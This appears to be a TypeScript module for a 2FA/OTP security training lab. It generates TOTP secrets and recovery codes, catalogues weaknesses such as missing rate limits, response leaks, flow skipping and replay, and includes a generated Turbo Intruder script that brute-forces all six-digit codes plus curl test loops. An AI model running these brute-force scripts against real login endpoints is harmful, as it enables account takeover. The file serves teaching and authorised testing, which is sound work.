/* 2FA / OTP Lab — generador de "totps de laboratorio": código TOTP vivo (con
   el motor TOTP ya existente), códigos de recuperación, respuestas de seguridad
   débiles y los ataques reales: brute force sin rate limit, race conditions,
   bypass por respuesta, backdoors y saltos de ventana. 100% local. */

import { randomTotpSecret, totp, base32EncodeKey } from './totp'

export interface LabSecret {
  secret: string
  issuer: string
  account: string
  uri: string
}

export const newLabSecret = (issuer = 'HackNexusLab', account = 'admin@lab.local'): LabSecret => {
  const secret = randomTotpSecret(20)
  return { secret, issuer, account, uri: `otpauth://totp/${issuer}:${account}?secret=${secret}&issuer=${issuer}` }
}

export const liveCode = async (secret: string, period = 30, digits = 6) => {
  const r = await totp(secret, period, digits)
  return r
}

/* Códigos de recuperación: el "segundo factor" que mucha gente guarda en txt */
export const generateRecoveryCodes = (count = 10): string[] => {
  const out: string[] = []
  const ab = 'ABCDEFGHJKMNPQRSTUVWXYZ23456789'
  for (let i = 0; i < count; i++) {
    let c = ''
    for (let j = 0; j < 10; j++) c += ab[crypto.getRandomValues(new Uint32Array(1))[0] % ab.length]
    out.push(`${c.slice(0, 5)}-${c.slice(5)}`)
  }
  return out
}

/* ─── debilidades típicas del segundo factor ─── */

export interface OtpWeakness {
  id: string
  title: string
  where: string
  why: string
  test: string
  severity: 'crítica' | 'alta' | 'media'
}

export const OTP_WEAKNESSES: OtpWeakness[] = [
  {
    id: 'no-ratelimit',
    title: 'Brute force sin rate limit',
    where: 'POST /2fa/verify',
    why: 'Un código de 6 dígitos tiene 1.000.000 combinaciones: sin bloqueo, un atacante con 3 ventanas de 30s y paralelismo lo prueba entero. Con reenvío automático del SMS encima, el código se refresca y el brute force no caduca.',
    test: 'Lanza 10.000 códigos con Turbo Intruder (HTTP/2 single-packet). Si ninguno dispara bloqueo ni captcha, el factor es decorativo.',
    severity: 'crítica',
  },
  {
    id: 'response-leak',
    title: 'Resultado en la respuesta',
    where: 'Respuesta de /2fa/verify o /2fa/status',
    why: 'APIs que devuelven {totp_required: false}, {otp: "123456"} en debug, o un boolean que cambia según el código: el estado del 2FA se enumera sin tener el factor.',
    test: 'Fuerza errores (json roto, tipos raros) y compara respuestas: si verify filtrado devuelve el código esperado o el estado del factor, game over.',
    severity: 'crítica',
  },
  {
    id: 'skip-state',
    title: 'Saltarse el estado del flujo',
    where: 'Endpoints /login y /2fa/verify',
    why: 'Si el servidor marca "autenticado" en sesión ANTES del 2FA (o el endpoint final acepta la cookie intermedia), basta con llamar a /dashboard directo tras el paso 1.',
    test: 'Login válido con contraseña → ANTES de verificar OTP, navega al endpoint protegido con la sesión intermedia.',
    severity: 'crítica',
  },
  {
    id: 'logic-recovery',
    title: 'Recuperación sin factor',
    where: '/account/recover, soporte',
    why: 'El proceso de recovery que pide solo datos públicos (nombre, fecha, DNI filtrado) convierte el 2FA en opcional: el atacante no rompe el OTP, cambia el teléfono.',
    test: 'Recorre el flujo de recovery completo anotando QUÉ se pide: si nada de ello es "algo que solo el usuario tiene", el 2FA tiene una puerta lateral.',
    severity: 'alta',
  },
  {
    id: 'window-wide',
    title: 'Ventana de validación enorme',
    where: 'Config del servidor TOTP',
    why: 'Un drift de ±10 ventanas (300s) multiplica x20 las combinaciones válidas y hace viable reuso de códigos viejos capturados (phishing en tiempo real incluido).',
    test: 'Prueba el código del intervalo anterior (y el de hace 5 min): si pasa, la ventana es excesiva.',
    severity: 'media',
  },
  {
    id: 'replay',
    title: 'Reuso del mismo código',
    where: 'POST /2fa/verify',
    why: 'RFC 4226 exige no aceptar el mismo counter dos veces: si el código se reutiliza, un phishing en tiempo real (modem/evilginx) sirve cada OTP capturado para múltiples sesiones.',
    test: 'Verifica con el MISMO código dos veces: si ambas pasan, no hay protección anti-replay.',
    severity: 'media',
  },
  {
    id: 'sec-questions',
    title: 'Preguntas de seguridad como factor',
    where: 'Configuración de cuenta',
    why: '"¿Nombre de tu primera mascota?" es OSINT, no conocimiento. Un 2FA respaldado solo por preguntas es 1FA con pasos extra.',
    test: 'Enumera las preguntas disponibles en registro: si se responden con redes sociales del objetivo, el factor es falso.',
    severity: 'alta',
  },
  {
    id: 'backup-predictable',
    title: 'Códigos de recuperación predecibles',
    where: 'POST /account/2fa/regenerate',
    why: 'Códigos secuenciales, de 4 dígitos, o generados con Math.random() son adivinables o brute-forceables: son LA llave de respaldo y deben tener entropía de contraseña.',
    test: 'Regenera 5 lotes de códigos y examina patrón (mismo prefijo, longitud corta, secuencias).',
    severity: 'alta',
  },
]

/* ─── flujo de brute force didáctico (genera el comando, no lo ejecuta) ─── */

export const buildOtpBruteScript = (endpoint: string, session: string): string =>
  [
    '# didáctico: SOLO contra TU laboratorio (tu propio 2FA en staging/DVWA/Juice-Shop)',
    '# Turbo Intruder (extensión Burp) — HTTP/2 single-packet attack',
    'def queueRequests(word, pools):',
    `    engine = RequestEngine(endpoint=${JSON.stringify(endpoint || '/2fa/verify')},`,
    '        concurrentConnections=30,',
    '        requestsPerConnection=100,',
    '        pipeline=False,  # con HTTP/2 usa engine.bframes() para single-packet',
    '    )',
    '    for i in range(1000000):',
    '        code = "%06d" % i',
    `        engine.queue('POST /2fa/verify HTTP/1.1\\r\\nHost: lab.local\\r\\nCookie: session=${session || 'TU_SESION_INTERMEDIA'}\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\n\\r\\ncode=' + code)`,
    '',
    'def handleResponse(req, interesting):',
    '    if "200" in req.status and "invalid" not in req.body:',
    '        table.add(req)',
  ].join('\n')

export const otpTestRequests = (endpoint: string): string =>
  [
    `# 1. ¿Cuántos intentos acepta antes de bloquear?`,
    `for i in $(seq 1 20); do curl -s -o /dev/null -w "%{http_code} " \\`,
    `  -X POST ${endpoint || 'https://lab.local/2fa/verify'} \\`,
    `  -H "Cookie: session=TU_SESION" -d "code=00000$i"; done; echo`,
    ``,
    `# 2. ¿El endpoint final valida el estado del flujo?`,
    `curl -s -H "Cookie: session=TU_SESION_INTERMEDIA" ${endpoint || 'https://lab.local'}/dashboard -o /dev/null -w "%{http_code}\\n"`,
    ``,
    `# 3. ¿Reusa códigos? (verifica el mismo OTP 2 veces)`,
    `# → repite la petición 1 con un código VÁLIDO ya usado: 200 dos veces = sin anti-replay`,
  ].join('\n')
